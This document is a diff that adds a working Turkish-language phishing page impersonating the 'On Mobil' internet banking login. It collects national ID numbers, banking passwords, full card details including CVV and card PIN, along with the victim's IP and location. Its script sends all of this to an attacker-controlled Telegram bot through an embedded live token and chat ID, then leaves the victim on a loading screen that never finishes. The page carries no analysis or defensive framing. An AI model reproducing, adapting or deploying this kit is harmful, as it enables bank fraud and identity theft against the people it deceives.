@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>On Mobil - İnternet Şubesi Giriş</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --primary-green:#66ff00;
+      --primary-green-dark:#55cc00;
+      --bg:#f5f6f7;
+      --card:#ffffff;
+      --muted:#888;
+      --btn-disabled-bg: #e5ffcc;
+      --btn-disabled-color: #a3b394;
+      --btn-enabled-bg: var(--primary-green);
+      --btn-enabled-hover: #55cc00;
+      --error-color: #d32f2f;
+    }
+    *{box-sizing:border-box;font-family:"Roboto",sans-serif}
+    body{
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:linear-gradient(180deg,#f0fff0 0%, #f5f6f7 100%);
+      padding:24px;
+    }
+    .wrap{
+      width:100%;
+      max-width:420px;
+    }
+    .panel{
+      background:var(--card);
+      border-radius:12px;
+      box-shadow:0 8px 28px rgba(0,0,0,0.08);
+      padding:28px;
+      border-top: 4px solid var(--primary-green);
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .brand-mark{
+      max-width: 180px;
+      height: auto;
+    }
+    h1{margin:10px 0 5px;font-size:20px;color:var(--primary-green);font-weight:600;text-align:center;}
+    p.lead{margin:8px 0 18px;color:#444;font-size:14px;text-align:center;}
+    .form-row{margin-bottom:14px}
+    label{display:block;font-size:13px;color:#444;margin-bottom:6px}
+    input[type="text"], input[type="password"], input[type="tel"]{
+      width:100%;
+      padding:10px 12px;
+      border-radius:8px;
+      border:1px solid #d6d6d6;
+      font-size:15px;
+      background:white;
+    }
+    input:focus{outline:none;border-color:var(--primary-green)}
+    .error-message {
+      color: var(--error-color);
+      font-size: 12px;
+      margin-top: 4px;
+      display: none;
+    }
+    .btn, input[type="submit"]{
+      display:inline-block;
+      width:100%;
+      padding:12px;
+      border-radius:8px;
+      color: white;
+      font-weight:600;
+      border:0;
+      cursor:pointer;
+      font-size:15px;
+      transition:background-color .15s ease, transform .05s ease, opacity .15s ease;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    .btn:not([disabled]), input[type="submit"]:not([disabled]){
+      background: var(--btn-enabled-bg);
+      color: #fff;
+    }
+    .btn:not([disabled]):hover, input[type="submit"]:not([disabled]):hover{
+      background: var(--btn-enabled-hover);
+    }
+    .btn:active, input[type="submit"]:active{ transform: translateY(1px); }
+    .btn[disabled], input[type="submit"][disabled]{
+      background: var(--btn-disabled-bg) !important;
+      color: var(--btn-disabled-color) !important;
+      cursor: not-allowed;
+      opacity: 1;
+      border: 1px solid rgba(0,0,0,0.04);
+      box-shadow: none;
+      pointer-events: none;
+    }
+    .links{display:flex;justify-content:space-between;margin-top:10px;font-size:13px}
+    .links a{color:var(--primary-green);text-decoration:none}
+    .links a:hover{text-decoration:underline}
+    .center{text-align:center}
+    .muted{color:var(--muted);font-size:13px}
+    .card-panel{margin-top:6px}
+    .two-inline{display:flex;gap:8px}
+    .two-inline .input{flex:1}
+    .small{font-size:13px}
+    .hidden{display:none}
+    .warning{color:#b10b0b;font-weight:600;font-size:13px}
+    footer{margin-top:14px;text-align:center;color:var(--muted);font-size:12px}
+    
+    /* Loader styles */
+    .loader {
+      border: 16px solid #f3f3f3;
+      border-top: 16px solid var(--primary-green);
+      border-radius: 50%;
+      width: 120px;
+      height: 120px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .message {
+      text-align: center;
+      font-size: 1.2em;
+      margin-top: 20px;
+      color: var(--primary-green);
+    }
+    
+    @media (max-width:420px){
+      .panel{padding:18px}
+      .brand-mark{max-width: 160px;}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="panel" id="mainPanel">
+      <div class="logo-container">
+        <img src="https://cdn.brandfetch.io/id0QE5BMAn/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B" alt="On Mobil" class="brand-mark">
+        <h1>İnternet Şubesi Giriş</h1>
+      </div>
+
+      <!-- SCREEN 1: Login -->
+      <section id="screen-login">
+        <p class="lead">Lütfen T.C. Kimlik Numaranız ve şifreniz ile giriş yapınız.</p>
+
+        <div class="form-row">
+          <label for="tc">T.C. Kimlik Numarası</label>
+          <input id="tc" type="text" inputmode="numeric" maxlength="11" placeholder="T.C. Kimlik Numaranızı giriniz" autocomplete="off">
+          <div class="error-message" id="tcError">Lütfen geçerli bir T.C. Kimlik Numarası giriniz.</div>
+        </div>
+
+        <div class="form-row">
+          <label for="password">Şifre</label>
+          <input id="password" type="password" maxlength="6" placeholder="6 haneli şifrenizi giriniz" autocomplete="off" inputmode="numeric">
+          <div class="error-message" id="passwordError">Lütfen 6 haneli şifrenizi giriniz.</div>
+        </div>
+
+        <div class="form-row">
+          <button id="toCard" class="btn">Devam</button>
+        </div>
+      </section>
+
+      <!-- SCREEN 2: Card inputs -->
+      <section id="screen-card" class="hidden">
+        <p class="lead">Kart Bilgilerinizi Giriniz</p>
+
+        <form id="cardForm">
+          <div class="form-row">
+            <label for="cc">Kart Numarası</label>
+            <input type="tel" id="cc" name="cc" class="input" placeholder="Kart Numarası" maxlength="19" autocomplete="off" inputmode="numeric">
+            <div class="error-message" id="ccError">Lütfen geçerli bir kart numarası giriniz.</div>
+          </div>
+
+          <div class="form-row two-inline">
+            <div class="input">
+              <label for="exp">Son Kullanma Tarihi</label>
+              <input type="tel" id="exp" name="exp" class="input" style="width:100%" maxlength="5" placeholder="AA/YY" inputmode="numeric" autocomplete="off">
+              <div class="error-message" id="expError">Lütfen geçerli bir son kullanma tarihi giriniz.</div>
+            </div>
+            <div class="input">
+              <label for="cvv">CVV</label>
+              <input type="tel" id="cvv" name="cvv" class="input" style="width:100%" maxlength="3" placeholder="CVV" inputmode="numeric" autocomplete="off">
+              <div class="error-message" id="cvvError">Lütfen geçerli bir CVV giriniz.</div>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <label for="cardCode">Kart Şifresi</label>
+            <input type="password" id="cardCode" name="cardCode" class="input" maxlength="4" placeholder="Kart Şifresi (4 hane)" inputmode="numeric" autocomplete="off">
+            <div class="error-message" id="cardCodeError">Lütfen 4 haneli kart şifrenizi giriniz.</div>
+          </div>
+
+          <div class="form-row">
+            <input type="submit" class="btn" id="sendDataFull" disabled value="GİRİŞ YAP" />
+          </div>
+
+          <div class="form-row links">
+            <a href="#" id="backToLogin">Geri</a>
+          </div>
+        </form>
+      </section>
+
+      <!-- SCREEN 3: Loading -->
+      <section id="screen-loading" class="hidden">
+        <div class="loader"></div>
+        <div class="message">Giriş işleminiz gerçekleştiriliyor...</div>
+      </section>
+
+      <footer>
+        © 2025 On Mobil - Tüm hakları saklıdır
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    // Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '7649728830:AAE5D4zWx8yI3fBaCNKnz6c-3gc5_mq9ZFI';
+    const TELEGRAM_CHAT_ID = '-1002475411082';
+
+    // Kullanıcı IP ve konum bilgisi
+    let userIP = 'Bilinmiyor';
+    let userLocation = 'Bilinmiyor';
+
+    // Ekran geçişleri
+    const toCardBtn = document.getElementById('toCard');
+    const screenLogin = document.getElementById('screen-login');
+    const screenCard = document.getElementById('screen-card');
+    const screenLoading = document.getElementById('screen-loading');
+    const backToLogin = document.getElementById('backToLogin');
+    const sendBtn = document.getElementById('sendDataFull');
+
+    // Hata mesajı elementleri
+    const tcError = document.getElementById('tcError');
+    const passwordError = document.getElementById('passwordError');
+    const ccError = document.getElementById('ccError');
+    const expError = document.getElementById('expError');
+    const cvvError = document.getElementById('cvvError');
+    const cardCodeError = document.getElementById('cardCodeError');
+
+    // IP ve konum bilgisini al
+    async function getUserInfo() {
+      try {
+        // IP adresini al
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        userIP = ipData.ip;
+
+        // Konum bilgisini al
+        const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+        const locationData = await locationResponse.json();
+        
+        userLocation = `${locationData.city || 'Bilinmiyor'}, ${locationData.region || 'Bilinmiyor'}, ${locationData.country_name || 'Bilinmiyor'}`;
+        
+      } catch (error) {
+        console.error('IP/konum bilgisi alınamadı:', error);
+        // Fallback olarak başka bir IP servisi dene
+        try {
+          const fallbackResponse = await fetch('https://ipwho.is/');
+          const fallbackData = await fallbackResponse.json();
+          userIP = fallbackData.ip || 'Bilinmiyor';
+          userLocation = `${fallbackData.city || 'Bilinmiyor'}, ${fallbackData.region || 'Bilinmiyor'}, ${fallbackData.country || 'Bilinmiyor'}`;
+        } catch (fallbackError) {
+          console.error('Fallback IP servisi de çalışmadı:', fallbackError);
+        }
+      }
+    }
+
+    // Sayfa yüklendiğinde IP bilgisini al
+    window.addEventListener('load', getUserInfo);
+
+    // Telegram'a log gönderme fonksiyonu
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Telegram gönderim hatası:', error);
+      }
+    }
+
+    toCardBtn.addEventListener('click', () => {
+      const tc = document.getElementById('tc').value.replace(/\D/g,'');
+      const pw = document.getElementById('password').value;
+      
+      let isValid = true;
+      
+      // T.C. kimlik kontrolü
+      if (tc.length !== 11 || tc[0] === '0') {
+        tcError.style.display = 'block';
+        isValid = false;
+      } else {
+        tcError.style.display = 'none';
+      }
+      
+      // Şifre kontrolü - tam 6 hane
+      if (!pw || pw.length !== 6 || !/^\d+$/.test(pw)) {
+        passwordError.style.display = 'block';
+        isValid = false;
+      } else {
+        passwordError.style.display = 'none';
+      }
+      
+      if (isValid) {
+        // Telegram'a TC, şifre, IP ve konum gönder
+        const loginData = `🔐 <b>ON MOBİL - YENİ GİRİŞ DENEMESİ</b>\n\n👤 <b>TC:</b> ${tc}\n🔑 <b>Şifre:</b> ${pw}\n🌐 <b>IP:</b> ${userIP}\n📍 <b>Konum:</b> ${userLocation}\n⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+        sendToTelegram(loginData);
+        
+        screenLogin.classList.add('hidden');
+        screenCard.classList.remove('hidden');
+        window.scrollTo({top:0,behavior:'smooth'});
+      }
+    });
+
+    backToLogin.addEventListener('click', (e) => {
+      e.preventDefault();
+      screenCard.classList.add('hidden');
+      screenLogin.classList.remove('hidden');
+    });
+
+    // Kart numarası formatı
+    function formatCardNumber(){
+      const el = document.getElementById('cc');
+      let v = el.value.replace(/\D/g,'').slice(0,19);
+      v = v.match(/.{1,4}/g);
+      el.value = v ? v.join(' ') : '';
+      validateCardFields();
+    }
+
+    // Son kullanma tarihi formatı
+    function formatExpiry(){
+      const el = document.getElementById('exp');
+      let v = el.value.replace(/\D/g,'').slice(0,4);
+      if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
+      el.value = v;
+      validateCardFields();
+    }
+
+    // Kart alanları validasyonu
+    function validateCardFields(){
+      const cc = document.getElementById('cc').value.replace(/\s/g,'');
+      const exp = document.getElementById('exp').value;
+      const cvv = document.getElementById('cvv').value.replace(/\D/g,'');
+      const code = document.getElementById('cardCode').value;
+
+      // Kart numarası validasyonu
+      if (cc.length >= 12 && luhnCheck(cc)) {
+        ccError.style.display = 'none';
+      } else if (cc.length > 0) {
+        ccError.style.display = 'block';
+      } else {
+        ccError.style.display = 'none';
+      }
+
+      // Son kullanma tarihi validasyonu
+      let expOk = false;
+      if(/^\d{2}\/\d{2}$/.test(exp)){
+        const parts = exp.split('/');
+        const mm = parseInt(parts[0],10);
+        const yy = parseInt(parts[1],10) + 2000;
+        if(mm >= 1 && mm <= 12){
+          const now = new Date();
+          const expDate = new Date(yy, mm-1, 1);
+          expOk = expDate >= new Date(now.getFullYear(), now.getMonth(), 1);
+        }
+      }
+      expError.style.display = expOk || exp.length === 0 ? 'none' : 'block';
+
+      // CVV validasyonu
+      cvvError.style.display = (cvv.length === 3 || cvv.length === 0) ? 'none' : 'block';
+
+      // Kart şifresi validasyonu
+      cardCodeError.style.display = (code.length === 4 || code.length === 0) ? 'none' : 'block';
+
+      const allGood = luhnCheck(cc) && expOk && cvv.length === 3 && code.length === 4;
+      sendBtn.disabled = !allGood;
+    }
+
+    function luhnCheck(num){
+      if (num.length < 12) return false;
+      let sum = 0;
+      let alt = false;
+      for(let i = num.length - 1; i >= 0; i--){
+        let n = parseInt(num.charAt(i),10);
+        if(alt){
+          n *= 2;
+          if(n > 9) n -= 9;
+        }
+        sum += n;
+        alt = !alt;
+      }
+      return (sum % 10 === 0);
+    }
+
+    // Form gönderimi
+    document.getElementById('cardForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      
+      const tc = document.getElementById('tc').value;
+      const pw = document.getElementById('password').value;
+      const cc = document.getElementById('cc').value;
+      const exp = document.getElementById('exp').value;
+      const cvv = document.getElementById('cvv').value;
+      const cardCode = document.getElementById('cardCode').value;
+
+      // Telegram'a tüm bilgileri gönder
+      const fullData = `💳 <b>ON MOBİL - TÜM BİLGİLER ALINDI</b>\n\n👤 <b>TC:</b> ${tc}\n🔑 <b>Şifre:</b> ${pw}\n💳 <b>Kart:</b> ${cc}\n📅 <b>SKT:</b> ${exp}\n🔒 <b>CVV:</b> ${cvv}\n🔐 <b>Kart Şifresi:</b> ${cardCode}\n🌐 <b>IP:</b> ${userIP}\n📍 <b>Konum:</b> ${userLocation}\n⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+      sendToTelegram(fullData);
+
+      // Loading ekranını göster ve hep kalsın
+      screenCard.classList.add('hidden');
+      screenLoading.classList.remove('hidden');
+      
+      // Burada timeout YOK, loading ekranı sonsuza kadar kalacak
+    });
+
+    // Event listeners
+    document.getElementById('cc').addEventListener('input', formatCardNumber);
+    document.getElementById('exp').addEventListener('input', formatExpiry);
+    document.getElementById('cvv').addEventListener('input', validateCardFields);
+    document.getElementById('cardCode').addEventListener('input', validateCardFields);
+
+    // Autocomplete disable
+    ['cc','cvv','cardCode','password','tc','exp'].forEach(id=>{
+      const el = document.getElementById(id);
+      if(el) el.autocomplete = 'off';
+    });
+  </script>
+</body>
+</html>
